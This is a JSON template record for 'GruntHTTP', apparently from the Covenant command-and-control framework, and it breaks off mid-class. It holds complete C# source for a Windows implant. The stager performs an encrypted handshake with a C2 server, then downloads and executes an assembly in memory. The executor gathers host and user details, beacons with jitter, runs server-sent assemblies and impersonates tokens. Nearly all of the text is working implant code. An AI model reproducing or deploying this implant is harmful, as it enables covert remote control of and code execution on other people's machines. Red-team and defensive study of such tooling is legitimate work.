{
  "id": 1,
  "name": "GruntHTTP",
  "description": "A Windows implant written in C# that communicates over HTTP.",
  "language": "cSharp",
  "commType": "http",
  "implantDirection": "pull",
  "compatibleListenerTypes": [
    {
      "id": 1,
      "name": "HTTP",
      "description": "Listens on HTTP protocol."
    }
  ],
  "compatibleDotNetVersions": [
    "net35",
    "net40"
  ],
  "stagerCode": "using System;\nusing System.Net;\nusing System.Linq;\nusing System.Text;\nusing System.Text.RegularExpressions;\nusing System.IO.Pipes;\nusing System.Reflection;\nusing System.Collections.Generic;\nusing System.Security.Cryptography;\n\nnamespace GruntStager\n{\n    public class GruntStager\n    {\n        public GruntStager()\n        {\n            ExecuteStager();\n        }\n        [STAThread]\n        public static void Main(string[] args)\n        {\n            new GruntStager();\n        }\n        public static void Execute()\n        {\n            new GruntStager();\n        }\n        public void ExecuteStager()\n        {\n            try\n            {\n                List<string> CovenantURIs = @\"{{REPLACE_COVENANT_URIS}}\".Split(',').ToList();\n                string CovenantCertHash = @\"{{REPLACE_COVENANT_CERT_HASH}}\";\n\t\t\t\tList<string> ProfileHttpHeaderNames = @\"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\n\t\t\t\tList<string> ProfileHttpHeaderValues = @\"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\n\t\t\t\tList<string> ProfileHttpUrls = @\"{{REPLACE_PROFILE_HTTP_URLS}}\".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();\n\t\t\t\tstring ProfileHttpPostRequest = @\"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}\".Replace(Environment.NewLine, \"\\n\");\n                string ProfileHttpPostResponse = @\"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}\".Replace(Environment.NewLine, \"\\n\");\n                bool ValidateCert = bool.Parse(@\"{{REPLACE_VALIDATE_CERT}}\");\n                bool UseCertPinning = bool.Parse(@\"{{REPLACE_USE_CERT_PINNING}}\");\n\n                Random random = new Random();\n                string aGUID = @\"{{REPLACE_GRUNT_GUID}}\";\n                string GUID = Guid.NewGuid().ToString().Replace(\"-\", \"\").Substring(0, 10);\n                byte[] SetupKeyBytes = Convert.FromBase64String(@\"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}\");\n                string MessageFormat = @\"{{\"\"GUID\"\":\"\"{0}\"\",\"\"Type\"\":{1},\"\"Meta\"\":\"\"{2}\"\",\"\"IV\"\":\"\"{3}\"\",\"\"EncryptedMessage\"\":\"\"{4}\"\",\"\"HMAC\"\":\"\"{5}\"\"}}\";\n\n                Aes SetupAESKey = Aes.Create();\n                SetupAESKey.Mode = CipherMode.CBC;\n                SetupAESKey.Padding = PaddingMode.PKCS7;\n                SetupAESKey.Key = SetupKeyBytes;\n                SetupAESKey.GenerateIV();\n                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);\n                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());\n\n                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));\n                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);\n                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);\n                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, \"0\", \"\", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));\n\n                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;\n                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>\n                {\n                    bool valid = true;\n                    if (UseCertPinning && CovenantCertHash != \"\")\n                    {\n                        valid = cert.GetCertHashString() == CovenantCertHash;\n                    }\n                    if (valid && ValidateCert)\n                    {\n                        valid = errors == System.Net.Security.SslPolicyErrors.None;\n                    }\n                    return valid;\n                };\n                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));\n                CookieWebClient wc = null;\n                string Stage0Response = \"\";\n                wc = new CookieWebClient();\n                wc.UseDefaultCredentials = true;\n                wc.Proxy = WebRequest.DefaultWebProxy;\n                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;\n                string CovenantURI = \"\";\n                foreach (string uri in CovenantURIs)\n                {\n                    try\n                    {\n                        for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\n                        {\n                            if (ProfileHttpHeaderNames[i] == \"Cookie\")\n                            {\n                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", \"\"));\n                            }\n                            else\n                            {\n                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", \"\"), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", \"\"));\n                            }\n                        }\n                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", \"\"));\n                        CovenantURI = uri;\n                    }\n                    catch\n                    {\n                        continue;\n                    }\n                }\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\n                {\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\n                    {\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\n                    }\n                    else\n                    {\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\n                    }\n                }\n                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\n                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\n                List<string> parsed = Parse(extracted, MessageFormat);\n                string iv64str = parsed[3];\n                string message64str = parsed[4];\n                string hash64str = parsed[5];\n                byte[] messageBytes = Convert.FromBase64String(message64str);\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\n                SetupAESKey.IV = Convert.FromBase64String(iv64str);\n                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\n                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);\n\n                Aes SessionKey = Aes.Create();\n                SessionKey.Mode = CipherMode.CBC;\n                SessionKey.Padding = PaddingMode.PKCS7;\n                SessionKey.Key = FullyDecrypted;\n                SessionKey.GenerateIV();\n                hmac = new HMACSHA256(SessionKey.Key);\n                byte[] challenge1 = new byte[4];\n                RandomNumberGenerator rng = RandomNumberGenerator.Create();\n                rng.GetBytes(challenge1);\n                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);\n                hash = hmac.ComputeHash(EncryptedChallenge1);\n\n                string Stage1Body = String.Format(MessageFormat, GUID, \"1\", \"\", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));\n                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));\n\n                string Stage1Response = \"\";\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\n                {\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\n                    {\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\n                    }\n                    else\n                    {\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\n                    }\n                }\n                Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\n                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\n                parsed = Parse(extracted, MessageFormat);\n                iv64str = parsed[3];\n                message64str = parsed[4];\n                hash64str = parsed[5];\n                messageBytes = Convert.FromBase64String(message64str);\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\n                SessionKey.IV = Convert.FromBase64String(iv64str);\n\n                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\n                byte[] challenge1Test = new byte[4];\n                byte[] challenge2 = new byte[4];\n                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);\n                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);\n                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }\n\n                SessionKey.GenerateIV();\n                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);\n                hash = hmac.ComputeHash(EncryptedChallenge2);\n\n                string Stage2Body = String.Format(MessageFormat, GUID, \"2\", \"\", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));\n                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));\n\n                string Stage2Response = \"\";\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\n                {\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\n                    {\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\n                    }\n                    else\n                    {\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\n                    }\n                }\n                Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\n                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\n                parsed = Parse(extracted, MessageFormat);\n                iv64str = parsed[3];\n                message64str = parsed[4];\n                hash64str = parsed[5];\n                messageBytes = Convert.FromBase64String(message64str);\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\n                SessionKey.IV = Convert.FromBase64String(iv64str);\n                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\n                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);\n                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });\n            }\n            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }\n        }\n\n        public class CookieWebClient : WebClient\n        {\n            public CookieContainer CookieContainer { get; private set; }\n            public CookieWebClient()\n            {\n                this.CookieContainer = new CookieContainer();\n            }\n            public void SetCookies(Uri uri, string cookies)\n            {\n                this.CookieContainer.SetCookies(uri, cookies);\n            }\n            protected override WebRequest GetWebRequest(Uri address)\n            {\n                var request = base.GetWebRequest(address) as HttpWebRequest;\n                if (request == null) return base.GetWebRequest(address);\n                request.CookieContainer = CookieContainer;\n                return request;\n            }\n        }\n\n        public static List<string> Parse(string data, string format)\n        {\n            format = Regex.Escape(format).Replace(\"\\\\{\", \"{\").Replace(\"{{\", \"{\").Replace(\"}}\", \"}\");\n            if (format.Contains(\"{0}\")) { format = format.Replace(\"{0}\", \"(?'group0'.*)\"); }\n            if (format.Contains(\"{1}\")) { format = format.Replace(\"{1}\", \"(?'group1'.*)\"); }\n            if (format.Contains(\"{2}\")) { format = format.Replace(\"{2}\", \"(?'group2'.*)\"); }\n            if (format.Contains(\"{3}\")) { format = format.Replace(\"{3}\", \"(?'group3'.*)\"); }\n            if (format.Contains(\"{4}\")) { format = format.Replace(\"{4}\", \"(?'group4'.*)\"); }\n            if (format.Contains(\"{5}\")) { format = format.Replace(\"{5}\", \"(?'group5'.*)\"); }\n            Match match = new Regex(format).Match(data);\n            List<string> matches = new List<string>();\n            if (match.Groups[\"group0\"] != null) { matches.Add(match.Groups[\"group0\"].Value); }\n            if (match.Groups[\"group1\"] != null) { matches.Add(match.Groups[\"group1\"].Value); }\n            if (match.Groups[\"group2\"] != null) { matches.Add(match.Groups[\"group2\"].Value); }\n            if (match.Groups[\"group3\"] != null) { matches.Add(match.Groups[\"group3\"].Value); }\n            if (match.Groups[\"group4\"] != null) { matches.Add(match.Groups[\"group4\"].Value); }\n            if (match.Groups[\"group5\"] != null) { matches.Add(match.Groups[\"group5\"].Value); }\n            return matches;\n        }\n\n        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}\n    }\n}",
  "executorCode": "using System;\nusing System.Net;\nusing System.Linq;\nusing System.Text;\nusing System.IO;\nusing System.IO.Pipes;\nusing System.IO.Compression;\nusing System.Threading;\nusing System.Reflection;\nusing System.Collections.Generic;\nusing System.Security.Principal;\nusing System.Security.AccessControl;\nusing System.Security.Cryptography;\nusing System.Text.RegularExpressions;\n\nnamespace GruntExecutor\n{\n    class Grunt\n    {\n        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)\n        {\n            try\n            {\n                int Delay = Convert.ToInt32(@\"{{REPLACE_DELAY}}\");\n                int Jitter = Convert.ToInt32(@\"{{REPLACE_JITTER_PERCENT}}\");\n                int ConnectAttempts = Convert.ToInt32(@\"{{REPLACE_CONNECT_ATTEMPTS}}\");\n                DateTime KillDate = DateTime.FromBinary(long.Parse(@\"{{REPLACE_KILL_DATE}}\"));\n\t\t\t\tList<string> ProfileHttpHeaderNames = @\"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\n                List<string> ProfileHttpHeaderValues = @\"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\n\t\t\t\tList<string> ProfileHttpUrls = @\"{{REPLACE_PROFILE_HTTP_URLS}}\".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();\n\t\t\t\tstring ProfileHttpGetResponse = @\"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}\".Replace(Environment.NewLine, \"\\n\");\n\t\t\t\tstring ProfileHttpPostRequest = @\"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}\".Replace(Environment.NewLine, \"\\n\");\n\t\t\t\tstring ProfileHttpPostResponse = @\"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}\".Replace(Environment.NewLine, \"\\n\");\n                bool ValidateCert = bool.Parse(@\"{{REPLACE_VALIDATE_CERT}}\");\n                bool UseCertPinning = bool.Parse(@\"{{REPLACE_USE_CERT_PINNING}}\");\n\n                string Hostname = Dns.GetHostName();\n                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();\n                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))\n                {\n                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)\n                    {\n                        IPAddress = a.ToString();\n                        break;\n                    }\n                }\n                string OperatingSystem = Environment.OSVersion.ToString();\n                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;\n                int Integrity = 2;\n                if (Environment.UserName.ToLower() == \"system\")\n                {\n                    Integrity = 4;\n                }\n                else\n                {\n                    var identity = WindowsIdentity.GetCurrent();\n                    if (identity.Owner != identity.User)\n                    {\n                        Integrity = 3;\n                    }\n                }\n                string UserDomainName = Environment.UserDomainName;\n                string UserName = Environment.UserName;\n\n                string RegisterBody = @\"{ \"\"integrity\"\": \" + Integrity + @\", \"\"process\"\": \"\"\" + Process + @\"\"\", \"\"userDomainName\"\": \"\"\" + UserDomainName + @\"\"\", \"\"userName\"\": \"\"\" + UserName + @\"\"\", \"\"delay\"\": \" + Convert.ToString(Delay) + @\", \"\"jitter\"\": \" + Convert.ToString(Jitter) + @\", \"\"connectAttempts\"\": \" + Convert.ToString(ConnectAttempts) + @\", \"\"status\"\": 0, \"\"ipAddress\"\": \"\"\" + IPAddress + @\"\"\", \"\"hostname\"\": \"\"\" + Hostname + @\"\"\", \"\"operatingSystem\"\": \"\"\" + OperatingSystem + @\"\"\" }\";\n                IMessenger baseMessenger = null;\n                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);\n                baseMessenger.Read();\n                baseMessenger.Identifier = GUID;\n                TaskingMessenger messenger = new TaskingMessenger\n                (\n                    new MessageCrafter(GUID, SessionKey),\n                    baseMessenger,\n                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)\n                );\n                messenger.QueueTaskingMessage(RegisterBody);\n                messenger.WriteTaskingMessage();\n                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);\n                try\n                {\n                    // A blank upward write, this helps in some cases with an HTTP Proxy\n                    messenger.QueueTaskingMessage(\"\");\n                    messenger.WriteTaskingMessage();\n                }\n                catch (Exception) { }\n                \n                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();\n                WindowsImpersonationContext impersonationContext = null;\n                Random rnd = new Random();\n                int ConnectAttemptCount = 0;\n                bool alive = true;\n                while (alive)\n                {\n                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));\n                    if (rnd.Next(2) == 0) { change = -change; }\n                    Thread.Sleep((Delay + change) * 1000);\n                    try\n                    {\n                        GruntTaskingMessage message = messenger.ReadTaskingMessage();\n                        if (message != null)\n                        {\n                            ConnectAttemptCount = 0;\n                            string output = \"\";\n                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)\n                            {\n                                if (int.TryParse(message.Message, out int val))\n                                {\n                                    if (message.Type == GruntTaskingType.SetDelay)\n                                    {\n                                        Delay = val;\n                                        output += \"Set Delay: \" + Delay;\n                                    }\n                                    else if (message.Type == GruntTaskingType.SetJitter)\n                                    {\n                                        Jitter = val;\n                                        output += \"Set Jitter: \" + Jitter;\n                                    }\n                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)\n                                    {\n                                        ConnectAttempts = val;\n                                        output += \"Set ConnectAttempts: \" + ConnectAttempts;\n                                    }\n                                }\n                                else\n                                {\n                                    output += \"Error parsing: \" + message.Message;\n                                }\n                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);\n                            }\n                            else if (message.Type == GruntTaskingType.SetKillDate)\n                            {\n                                if (DateTime.TryParse(message.Message, out DateTime date))\n                                {\n                                    KillDate = date;\n                                    output += \"Set KillDate: \" + KillDate.ToString();\n                                }\n                                else\n                                {\n                                    output += \"Error parsing: \" + message.Message;\n                                }\n                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);\n                            }\n                            else if (message.Type == GruntTaskingType.Exit)\n                            {\n                                output += \"Exited\";\n                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);\n                                messenger.WriteTaskingMessage();\n                                return;\n                            }\n                            else if(message.Type == GruntTaskingType.Tasks)\n                            {\n                                if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += \"No active tasks!\"; }\n                                else\n                                {\n                                    output += \"Task       Status\" + Environment.NewLine;\n                                    output += \"----       ------\" + Environment.NewLine;\n                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + \" Active\").ToArray());\n                                }\n                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);\n                            }\n                            else if(message.Type == GruntTaskingType.TaskKill)\n                            {\n                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());\n                                if (!matched.Any())\n                                {\n                                    output += \"No active task with name: \" + message.Message;\n                                }\n                                else\n                                {\n                                    KeyValuePair<string, Thread> t = matched.First();\n                                    t.Value.Abort();\n                                    Thread.Sleep(3000);\n                                    if (t.Value.IsAlive)\n                                    {\n                                        t.Value.Suspend();\n                                    }\n                                    output += \"Task: \" + t.Key + \" killed!\";\n                                }\n                                messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);\n                            }\n                            else if (message.Token)\n                            {\n                                if (impersonationContext != null)\n                                {\n                                    impersonationContext.Undo();\n                                }\n                                IntPtr impersonatedToken = IntPtr.Zero;\n                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message, Delay));\n                                t.Start();\n                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));\n                                bool completed = t.Join(5000);\n                                if (completed && impersonatedToken != IntPtr.Zero)\n                                {\n                                    try\n                                    {\n                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);\n                                        impersonationContext = identity.Impersonate();\n                                    }\n                                    catch (ArgumentException) { }\n                                }\n                                else\n                                {\n                                    impersonationContext = null;\n                                }\n                            }\n                            else\n                            {\n                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));\n                                t.Start();\n                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));\n                            }\n                        }\n                        messenger.WriteTaskingMessage();\n                    }\n                    catch (ObjectDisposedException e)\n                    {\n                        ConnectAttemptCount++;\n                        messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, \"\").ToJson());\n                        messenger.WriteTaskingMessage();\n                    }\n                    catch (Exception e)\n                    {\n                        ConnectAttemptCount++;\n                        Console.Error.WriteLine(\"Loop Exception: \" + e.GetType().ToString() + \" \" + e.Message + Environment.NewLine + e.StackTrace);\n                    }\n                    if (ConnectAttemptCount >= ConnectAttempts) { return; }\n                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }\n                }\n            }\n            catch (Exception e)\n            {\n                Console.Error.WriteLine(\"Outer Exception: \" + e.Message + Environment.NewLine + e.StackTrace);\n            }\n        }\n\n        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)\n        {\n            const int MAX_MESSAGE_SIZE = 1048576;\n            string output = \"\";\n            try\n            {\n                if (message.Type == GruntTaskingType.Assembly)\n                {\n                    string[] pieces = message.Message.Split(',');\n                    if (pieces.Length > 0)\n                    {\n                        object[] parameters = null;\n                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }\n                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }\n                        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);\n                        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);\n                        Assembly gruntTask = Assembly.Load(decompressedBytes);\n                        PropertyInfo streamProp = gruntTask.GetType(\"Task\").GetProperty(\"OutputStream\");\n                        string results = \"\";\n                        if (streamProp == null)\n                        {\n                            results = (string) gruntTask.GetType(\"Task\").GetMethod(\"Execute\").Invoke(null, parameters);\n                        }\n                        else\n                        {\n                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType(\"Task\").GetMethod(\"Execute\").Invoke(null, parameters));\n                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))\n                            {\n                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))\n                                {\n                                    streamProp.SetValue(null, pipeClient, null);\n                                    DateTime lastTime = DateTime.Now;\n                                    invokeThread.Start();\n                                    using (StreamReader reader = new StreamReader(pipeServer))\n                                    {\n                                        object synclock = new object();\n                                        string currentRead = \"\";\n                                        Thread readThread = new Thread(() => {\n                                            int count;\n                                            char[] read = new char[MAX_MESSAGE_SIZE];\n                                            while ((count = reader.Read(read, 0, read.Length)) > 0)\n                                            {\n                                                lock (synclock)\n                                                {\n                                                    currentRead += new string(read, 0, count);\n                                                }\n                                            }\n                                        });\n                                        readThread.Start();\n                                        while (readThread.IsAlive)\n                                        {\n                                            Thread.Sleep(Delay * 1000);\n                                            lock (synclock)\n                                            {\n                                                try\n                                                {\n                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)\n                                                    {\n                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)\n                                                        {\n                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));\n                                                            try\n                                                            {\n                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);\n                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);\n                                                            }\n                                                            catch (Exception) {}\n                                                        }\n                                                        currentRead = \"\";\n                                                        lastTime = DateTime.Now;\n                                                    }\n                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))\n                                                    {\n                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);\n                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);\n                                                        currentRead = \"\";\n                                                        lastTime = DateTime.Now;\n                                                    }\n                                                }\n                                                catch (ThreadAbortException) { break; }\n                                                catch (Exception) { currentRead = \"\"; }\n                                            }\n                                        }\n                                        output += currentRead;\n                                    }\n                                }\n                            }\n                            invokeThread.Join();\n                        }\n                        output += results;\n                    }\n                }\n                else if (message.Type == GruntTaskingType.Connect)\n                {\n                    string[] split = message.Message.Split(',');\n                    bool connected = messenger.Connect(split[0], split[1]);\n                    output += connected ? \"Connection to \" + split[0] + \":\" + split[1] + \" succeeded!\" :\n                                          \"Connection to \" + split[0] + \":\" + split[1] + \" failed.\";\n                }\n                else if (message.Type == GruntTaskingType.Disconnect)\n                {\n                    bool disconnected = messenger.Disconnect(message.Message);\n                    output += disconnected ? \"Disconnect succeeded!\" : \"Disconnect failed.\";\n                }\n            }\n            catch (Exception e)\n            {\n                try\n                {\n                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, \"Task Exception: \" + e.Message + Environment.NewLine + e.StackTrace);\n                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);\n                }\n                catch (Exception) { }\n            }\n            finally\n            {\n                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)\n                {\n                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));\n                    try\n                    {\n                        GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;\n                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);\n                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);\n                    }\n                    catch (Exception) {}\n                }\n                if (string.IsNullOrEmpty(output))\n                {\n                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, \"\");\n                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);\n                }\n            }\n            return WindowsIdentity.GetCurrent().Token;\n        }\n    }\n\n    public enum MessageType\n    {\n        Read,\n        Write\n    }\n\n    public class ProfileMessage\n    {\n        public MessageType Type { get; set; }\n        public string Message { get; set; }\n    }\n\n    public class MessageEventArgs : EventArgs\n    {\n        public string Message { get; set; }\n    }\n\n    public interface IMessenger\n    {\n        string Hostname { get; }\n        string Identifier { get; set; }\n        string Authenticator { get; set; }\n        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }\n        ProfileMessage Read();\n        void Write(string Message);\n        void Close();\n    }\n\n    public class Profile\n    {\n        private string GetResponse { get; }\n        private string PostRequest { get; }\n        private string PostResponse { get; }\n\n        public Profile(string GetResponse, string PostRequest, string PostResponse)\n        {\n            this.GetResponse = GetResponse;\n            this.PostRequest = PostRequest;\n            this.PostResponse = PostResponse;\n        }\n\n        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }\n        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }\n        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }\n        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }\n        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }\n        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }\n\n        private static GruntEncryptedMessage Parse(string Format, string Message)\n        {\n            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(\n                Utilities.Parse(Message, Format)[0]\n            ));\n            if (json == null || json.Length < 3)\n            {\n                return null;\n            }\n            return GruntEncryptedMessage.FromJson(json);\n        }\n\n        private static string Format(string Format, GruntEncryptedMessage Message)\n        {\n            return String.Format(Format,\n                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))\n            );\n        }\n    }\n\n    public class TaskingMessenger\n    